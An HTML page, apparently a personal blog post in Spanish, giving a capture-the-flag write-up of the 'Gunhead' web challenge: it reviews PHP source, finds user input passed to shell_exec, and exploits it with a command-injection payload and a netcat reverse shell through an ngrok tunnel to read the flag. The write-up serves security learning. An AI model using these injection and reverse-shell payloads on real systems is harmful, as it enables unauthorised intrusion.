@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Gunhead Cyber Apocalypse 2023</title>
+
+  <meta name="description" content="Resolución del challenge Gunhead del Cyber Apocalypse 2023">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Gunhead Cyber Apocalypse 2023">
+  <meta name="twitter:description" content="Resolución del challenge Gunhead del Cyber Apocalypse 2023">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/web.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Gunhead Cyber Apocalypse 2023">
+  <meta property="og:description" content="Resolución del challenge Gunhead del Cyber Apocalypse 2023">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/web.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/web.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Gunhead Cyber Apocalypse 2023" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/ca2023" title="GatoGamer1155" class="blog-button">Cyber Apocalypse</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Cyber Apocalypse 2023</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/web.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Gunhead</h2><br>
+  </header>
+
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Al entrar en la web principal podemos ver una página bastante sencilla donde no encontramos mucho de donde tirar en realidad asi que lo dejamos de lado</p>
+<a href="/ca2023/gunhead/1.png" target="_blank"><div><p><img src="/ca2023/gunhead/1.png"></p></div></a>
+
+<p class="plain-text">Analizemos los archivos del zip, donde tenemos varios archivos de configuración de docker entre otros y todo el <code class="language-plaintext highlighter-rouge">código fuente</code> del proyecto que es la página web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls </span><span class="p">-l
+drwxr-xr-x gato gato  94 B Fri Mar 10 04:10:06 2023 </span><span class="az"> challenge</span><span class="p">
+drwxr-xr-x gato gato  68 B Fri Mar 10 04:10:06 2023 </span><span class="az"> config</span><span class="p">
+.rwxr-xr-x gato gato 127 B Fri Mar 10 04:10:06 2023 </span><span class="ve"> build-docker.sh</span><span class="p">  
+.rw-r--r-- gato gato 788 B Fri Mar 10 04:10:06 2023  Dockerfile
+.rw-r--r-- gato gato  26 B Fri Mar 10 04:10:06 2023  flag.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro del directorio <code class="language-plaintext highlighter-rouge">challenge</code> encontramos algunos archivos con extensión <code class="language-plaintext highlighter-rouge">.php</code> asi que probablemente sea la raíz donde esta montada toda la web
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls </span><span class="p">-l
+drwxr-xr-x gato gato  38 B  Fri Mar 10 04:10:06 2023 </span><span class="az"> controllers</span><span class="p">  
+drwxr-xr-x gato gato  28 B  Fri Mar 10 04:10:06 2023 </span><span class="az"> models</span><span class="p">
+drwxr-xr-x gato gato  32 B  Fri Mar 10 04:10:06 2023 </span><span class="az"> static</span><span class="p">
+drwxr-xr-x gato gato  18 B  Fri Mar 10 04:10:06 2023 </span><span class="az"> views</span><span class="p">
+.rw-r--r-- gato gato 485 B  Fri Mar 10 04:10:06 2023 </span><span class="p"> index.php</span><span class="p">
+.rw-r--r-- gato gato 3.0 KB Fri Mar 10 04:10:06 2023 </span><span class="p"> Router.php</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos ver un <code class="language-plaintext highlighter-rouge">index</code> asi que demosle un vistazo para analizarlo en busca de vulns</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">index.php
+&lt?php 
+</span><span class="no">date_default_timezone_set</span><span class="p">(</span><span class="s">'UTC'</span><span class="p">);
+
+</span><span class="no">spl_autoload_register</span><span class="p">(</span><span class="o">function </span><span class="p">($</span><span class="am">name</span><span class="p">){
+    </span><span class="o">if </span><span class="p">(</span><span class="no">preg_match</span><span class="p">(</span><span class="s">'/Controller</span><span class="o">$</span><span class="p">/'</span><span class="p">, $name))
+    {
+        $name </span><span class="o">= </span><span class="s">"controllers/</span><span class="p">{$name}</span><span class="s">"</span><span class="p">;
+    }
+    </span><span class="o">else if</span><span class="p"> (</span><span class="no">preg_match</span><span class="p">(</span><span class="s">'/Model</span><span class="o">$</span><span class="s">/'</span><span class="p">, $name))
+    {
+        $name </span><span class="o">= </span><span class="s">"models/</span><span class="p">{$name}</span><span class="s">"</span><span class="p">;
+    }
+    </span><span class="o">include_once </span><span class="s">"</span><span class="p">{$name}</span><span class="s">.php"</span><span class="p">;
+});
+
+$router </span><span class="o">= </span><span class="am">new </span><span class="p">Router();
+$router->new(</span><span class="s">'GET'</span><span class="p">, </span><span class="s">'/'</span><span class="p">, </span><span class="s">'ReconController@index'</span><span class="p">);
+$router->new(</span><span class="s">'POST'</span><span class="p">, </span><span class="s">'/api/ping'</span><span class="p">, </span><span class="s">'ReconController@ping'</span><span class="p">);  
+
+$response </span><span class="o">=</span><span class="p"> $router->match();
+
+</span><span class="o">die</span><span class="p">($response);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de definir la zona horaria, con <code class="language-plaintext highlighter-rouge">spl_autoload_register</code> se define una función que se ejecuta cada vez que se intenta cargar una clase no definida, si el nombre termina en <code class="language-plaintext highlighter-rouge">Controller</code> busca el archivo en la carpeta <code class="language-plaintext highlighter-rouge">controllers</code>, si termina en <code class="language-plaintext highlighter-rouge">Model</code> lo busca en la carpeta <code class="language-plaintext highlighter-rouge">models</code> e incluye el archivo con <code class="language-plaintext highlighter-rouge">include_once</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">spl_autoload_register</span><span class="p">(</span><span class="o">function </span><span class="p">($</span><span class="am">name</span><span class="p">){
+    </span><span class="o">if </span><span class="p">(</span><span class="no">preg_match</span><span class="p">(</span><span class="s">'/Controller</span><span class="o">$</span><span class="p">/'</span><span class="p">, $name))  
+    {
+        $name </span><span class="o">= </span><span class="s">"controllers/</span><span class="p">{$name}</span><span class="s">"</span><span class="p">;
+    }
+    </span><span class="o">else if</span><span class="p"> (</span><span class="no">preg_match</span><span class="p">(</span><span class="s">'/Model</span><span class="o">$</span><span class="s">/'</span><span class="p">, $name))
+    {
+        $name </span><span class="o">= </span><span class="s">"models/</span><span class="p">{$name}</span><span class="s">"</span><span class="p">;
+    }
+    </span><span class="o">include_once </span><span class="s">"</span><span class="p">{$name}</span><span class="s">.php"</span><span class="p">;
+});</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora de la clase <code class="language-plaintext highlighter-rouge">router</code> usa el método <code class="language-plaintext highlighter-rouge">new</code> para pasarle varios parametros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$router </span><span class="o">= </span><span class="am">new </span><span class="p">Router();
+$router->new(</span><span class="s">'GET'</span><span class="p">, </span><span class="s">'/'</span><span class="p">, </span><span class="s">'ReconController@index'</span><span class="p">);
+$router->new(</span><span class="s">'POST'</span><span class="p">, </span><span class="s">'/api/ping'</span><span class="p">, </span><span class="s">'ReconController@ping'</span><span class="p">);  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto lo encontramos en el <code class="language-plaintext highlighter-rouge">Router.php</code>, el método new recibe 3 parametros, <code class="language-plaintext highlighter-rouge">method</code> indica el método HTTP, <code class="language-plaintext highlighter-rouge">route</code> indica la ruta, y <code class="language-plaintext highlighter-rouge">controller</code> indica el nombre de la clase y el método del controlador separados por <code class="language-plaintext highlighter-rouge">@</code> después define una variable <code class="language-plaintext highlighter-rouge">$r</code> que es un array con las claves method y route y sus valores correspondientes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">class </span><span class="no">Router </span><span class="p">
+{
+    </span><span class="o">public </span><span class="p">$routes </span><span class="o">=</span><span class="p"> [];
+
+    </span><span class="o">public function </span><span class="no">new</span><span class="p">($</span><span class="am">method</span><span class="p">, $</span><span class="am">route</span><span class="p">, $</span><span class="am">controller</span><span class="p">)  
+    {
+        $r </span><span class="o">=</span><span class="p"> [
+            </span><span class="s">'method'</span><span class="o"> =></span><span class="p"> $method,
+            </span><span class="s">'route'  </span><span class="o">=></span><span class="p"> $route,
+        ];</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si el <code class="language-plaintext highlighter-rouge">método</code> en controller se puede llamar agrega al array <code class="language-plaintext highlighter-rouge">controller</code> con su valor respectivo y agrega el array a la lista de rutas disponibles definida en <code class="language-plaintext highlighter-rouge">routes</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">if </span><span class="p">(</span><span class="no">is_callable</span><span class="p">($controller))
+{
+    $r[</span><span class="s">'controller'</span><span class="p">]    </span><span class="o">=</span><span class="p"> $controller;  
+    $this->routes[]     </span><span class="o">=</span><span class="p"> $r;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En caso de no cumplirse pero <code class="language-plaintext highlighter-rouge">@</code> este representado la primera parte el controller la define como <code class="language-plaintext highlighter-rouge">class</code> y la segunda como <code class="language-plaintext highlighter-rouge">function</code>, después agrega esto al array como <code class="language-plaintext highlighter-rouge">controller</code> y lo agrega a la lista de rutas disponibles</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">else if</span><span class="p"> (</span><span class="no">strpos</span><span class="p">($controller, </span><span class="s">'@'</span><span class="p">))
+{
+    $split      </span><span class="o">= </span><span class="no">explode</span><span class="p">(</span><span class="s">'@'</span><span class="p">, $controller);  
+    $class      </span><span class="o">= </span><span class="p">$split[</span><span class="mi">0</span><span class="p">];
+    $function   </span><span class="o">= </span><span class="p">$split[</span><span class="mi">1</span><span class="p">];
+    
+    $r[</span><span class="s">'controller'</span><span class="p">] </span><span class="o">=</span><span class="p"> [
+        </span><span class="s">'class'</span><span class="p">     </span><span class="o">=></span><span class="p"> $class,
+        </span><span class="s">'function'</span><span class="o">  => </span><span class="p">$function
+    ];
+    
+    $this->routes[] </span><span class="o">=</span><span class="p"> $r;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En caso que no cumpla ningun condicional lanza una excepción y detiene el script</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">else</span><span class="p">
+{
+    </span><span class="o">throw </span><span class="am">new </span><span class="na">Exception</span><span class="p">(</span><span class="s">'Invalid controller'</span><span class="p">);  
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para entenderlo mejor digamos que optamos por la segunda opción definida en el index lanzando una petición con <code class="language-plaintext highlighter-rouge">curl</code> por <code class="language-plaintext highlighter-rouge">POST</code> hacia <code class="language-plaintext highlighter-rouge">/api/ping</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s -X POST http://165.232.108.240:30746/api/ping | </span><span class="ve">jq</span><span class="p">  
+{
+  </span><span class="az">"message"</span><span class="p">: </span><span class="ve">"Insufficient parameters!"</span><span class="p">
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacer esto buscará el método <code class="language-plaintext highlighter-rouge">ping</code> de la clase <code class="language-plaintext highlighter-rouge">ReconController</code> que podemos encontrar en el php del mismo nombre dentro de la carpeta <code class="language-plaintext highlighter-rouge">controllers</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">controllers/ReconController.php
+&lt?php
+</span><span class="na">class </span><span class="no">ReconController</span><span class="p">
+{
+    </span><span class="o">public function </span><span class="no">index</span><span class="p">($</span><span class="am">router</span><span class="p">)
+    {
+        </span><span class="o">return </span><span class="p">$router->view(</span><span class="s">'index'</span><span class="p">);
+    }
+
+    </span><span class="o">public function </span><span class="no">ping</span><span class="p">($</span><span class="am">router</span><span class="p">)
+    {
+        $jsonBody </span><span class="o">= </span><span class="no">json_decode</span><span class="p">(</span><span class="no">file_get_contents</span><span class="p">(</span><span class="s">'php://input'</span><span class="p">), </span><span class="mi">true</span><span class="p">);
+
+        </span><span class="o">if</span><span class="p"> (</span><span class="o">empty</span><span class="p">($jsonBody) </span><span class="o">|| !</span><span class="no">array_key_exists</span><span class="p">(</span><span class="s">'ip'</span><span class="p">, $jsonBody))
+        {
+            </span><span class="o">return </span><span class="p">$router->jsonify([</span><span class="s">'message' </span><span class="o">=></span><span class="s"> 'Insufficient parameters!'</span><span class="p">]);  
+        }
+
+        $pingResult </span><span class="o">=</span><span class="am"> new </span><span class="p">ReconModel($jsonBody[</span><span class="s">'ip'</span><span class="p">]);
+
+        </span><span class="o">return </span><span class="p">$router->jsonify([</span><span class="s">'output' </span><span class="o">=></span><span class="p"> $pingResult->getOutput()]);
+    }
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que al apuntar a <code class="language-plaintext highlighter-rouge">/api/ping</code> esta apuntara al método <code class="language-plaintext highlighter-rouge">ping</code> de la clase <code class="language-plaintext highlighter-rouge">ReconController</code> asi que enfoquemonos en ella, esta inicia obteniendo la data de la solicitud con <code class="language-plaintext highlighter-rouge">file_get_contents</code> y la trata para obtener un <code class="language-plaintext highlighter-rouge">json</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">public function </span><span class="no">ping</span><span class="p">($</span><span class="am">router</span><span class="p">)
+    {
+        $jsonBody </span><span class="o">= </span><span class="no">json_decode</span><span class="p">(</span><span class="no">file_get_contents</span><span class="p">(</span><span class="s">'php://input'</span><span class="p">), </span><span class="mi">true</span><span class="p">);  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues verifica que el campo <code class="language-plaintext highlighter-rouge">ip</code> tramitado exista y tenga un valor de lo contrario muestra un mensaje que dice que los parametros son insuficientes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">if </span><span class="p">(</span><span class="no">empty</span><span class="p">($jsonBody) </span><span class="o">|| !</span><span class="no">array_key_exists</span><span class="p">(</span><span class="s">'ip'</span><span class="p">, $jsonBody))
+{
+    </span><span class="o">return </span><span class="p">$router->jsonify([</span><span class="s">'message' </span><span class="o">=></span><span class="s"> 'Insufficient parameters!'</span><span class="p">])  
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora para obtener un valor para el campo <code class="language-plaintext highlighter-rouge">output</code> accede a el método <code class="language-plaintext highlighter-rouge">getOutput</code> de la clase <code class="language-plaintext highlighter-rouge">ReconModel</code> pasandole el valor de el campo ip que obtiene del json</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$pingResult </span><span class="o">= </span><span class="am">new </span><span class="p">ReconModel($jsonBody[</span><span class="s">'ip'</span><span class="p">]);
+
+</span><span class="o">return </span><span class="p">$router->jsonify([</span><span class="s">'output' </span><span class="o">=></span><span class="p"> $pingResult->getOutput()]);  </span> 
+</code></pre></div></div><br>
+
+<p class="plain-text">La clase la encontramos en el php del mismo nombre dentro del directorio <code class="language-plaintext highlighter-rouge">models</code> en el metodo encontramos una vulnerabilidad ya que mete a la ip le envia 3 trazas con <code class="language-plaintext highlighter-rouge">ping</code> pero no sanitiza el input y lo ejecuta directamente con <code class="language-plaintext highlighter-rouge">shell_exec</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">models/ReconModel.php
+&lt?php
+</span><span class="c1">#[AllowDynamicProperties]
+
+</span><span class="na">class </span><span class="no">ReconModel</span><span class="p">
+{   
+    </span><span class="o">public function </span><span class="no">__construct</span><span class="p">($</span><span class="am">ip</span><span class="p">)
+    {
+        $this->ip </span><span class="o">=</span><span class="p"> $ip;
+    }
+
+    </span><span class="o">public function </span><span class="no">getOutput</span><span class="p">()
+    {
+        </span><span class="c1"># Do I need to sanitize user input before passing it to shell_exec?  
+        </span><span class="o">return </span><span class="no">shell_exec</span><span class="p">(</span><span class="s">'ping -c 3 '</span><span class="no">.</span><span class="p">$this->ip);
+    }
+}</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">El funcionamiento normal seria pasarle en data un <code class="language-plaintext highlighter-rouge">json</code> con un campo <code class="language-plaintext highlighter-rouge">ip</code> que su valor sea un host como <code class="language-plaintext highlighter-rouge">google.es</code>, esto nos devuelve la salida del comando <code class="language-plaintext highlighter-rouge">ping</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s http://165.232.108.240:30746/api/ping -d </span><span class="am">'{"ip": "google.es"}' </span><span class="p">|</span><span class="ve"> jq</span><span class="p">  
+{
+  </span><span class="az">"output"</span><span class="p">: </span><span class="ve">"PING google.es (142.250.180.3): 56 data bytes\n"</span><span class="p">
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo podemos enviar cualquier cosa como <code class="language-plaintext highlighter-rouge">test</code> y con <code class="language-plaintext highlighter-rouge">;</code> concatenarle un comando por ejemplo <code class="language-plaintext highlighter-rouge">id</code> en el output podemos ver que lo ejecuta como <code class="language-plaintext highlighter-rouge">www</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s http://165.232.108.240:30746/api/ping -d </span><span class="am">'{"ip": "test; id"}' </span><span class="p">|</span><span class="ve"> jq  </span><span class="p">
+{
+  </span><span class="az">"output"</span><span class="p">: </span><span class="ve">"uid=1000(www) gid=1000(www) groups=1000(www)\n"</span><span class="p">
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para enviarnos una shell escuchamos con <code class="language-plaintext highlighter-rouge">netcat</code> y con ngrok exponemos un puerto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo ngrok </span><span class="p">tcp 443
+
+</span><span class="ve">Session Status                online</span><span class="p">
+Region                        United States (us)
+Forwarding                    tcp://0.tcp.ngrok.io:12944 -> localhost:443
+
+Connections                   ttl     opn     rt1     rt5     p50     p90   
+                              0       0       0.00    0.00    0.00    0.00  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">nc</code> nos enviamos una <code class="language-plaintext highlighter-rouge">/bin/sh</code> a nuestro host y puerto de <code class="language-plaintext highlighter-rouge">ngrok</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s http://165.232.108.240:30746/api/ping -d </span><span class="am">'{"ip": "test; nc 0.tcp.ngrok.io 12944 -e /bin/sh"}'  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En nuestro listener recibimos la shell como <code class="language-plaintext highlighter-rouge">www</code> en el servidor que aloja la web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 127.0.0.1
+id
+uid=1000(www) gid=1000(www) groups=1000(www)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para tener un <code class="language-plaintext highlighter-rouge">prompt</code> y sea mas comodo visualmente con <code class="language-plaintext highlighter-rouge">python</code> lanzamos una sh</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">python3 -c 'import pty; pty.spawn("/bin/sh")'  
+/www $ id     
+uid=1000(www) gid=1000(www) groups=1000(www)
+/www $</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos los archivos en la raiz encontramos la <code class="language-plaintext highlighter-rouge">flag</code> asi que finalmente la leemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">/www $ cd /      
+/ $ ls -l   
+drwxr-xr-x    2 root     root          4096 Feb 10 16:46 </span><span class="az">bin</span><span class="p">
+drwxr-xr-x    5 root     root           360 Mar 21 06:07 </span><span class="az">dev</span><span class="p">
+drwxr-xr-x    1 root     root          4096 Mar 21 06:07 </span><span class="az">etc</span><span class="p">
+-rwxr-xr-x    1 root     root            34 Mar 16 16:15 </span><span class="ve">flag.txt</span><span class="p">  
+drwxr-xr-x    1 root     root          4096 Mar 17 12:15 </span><span class="az">home</span><span class="p">
+drwxr-xr-x    1 root     root          4096 Mar 17 12:15 </span><span class="az">lib</span><span class="p">
+drwxr-xr-x    5 root     root          4096 Feb 10 16:46 </span><span class="az">media</span><span class="p">
+drwxr-xr-x    2 root     root          4096 Feb 10 16:46 </span><span class="az">mnt</span><span class="p">
+drwxr-xr-x    2 root     root          4096 Feb 10 16:46 </span><span class="az">opt</span><span class="p">
+dr-xr-xr-x  310 root     root             0 Mar 21 06:07 </span><span class="az">proc</span><span class="p">
+drwx------    2 root     root          4096 Feb 10 16:46 </span><span class="az">root</span><span class="p">
+drwxr-xr-x    1 root     root          4096 Mar 21 06:07 </span><span class="az">run</span><span class="p">
+drwxr-xr-x    1 root     root          4096 Mar 17 12:15 </span><span class="az">sbin</span><span class="p">
+drwxr-xr-x    2 root     root          4096 Feb 10 16:46 </span><span class="az">srv</span><span class="p">
+dr-xr-xr-x   13 root     root             0 Mar 21 06:07 </span><span class="az">sys</span><span class="p">
+drwxrwxrwt    1 root     root          4096 Mar 21 06:27 </span><span class="az">tmp</span><span class="p">
+drwxr-xr-x    1 root     root          4096 Mar 17 12:15 </span><span class="az">usr</span><span class="p">
+drwxr-xr-x    1 root     root          4096 Mar 17 12:15 </span><span class="az">var</span><span class="p">
+drwxr-xr-x    1 www      www           4096 Mar 17 12:15 </span><span class="az">www</span><span class="p">
+/ $ cat flag.txt
+HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}
+/ $</span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
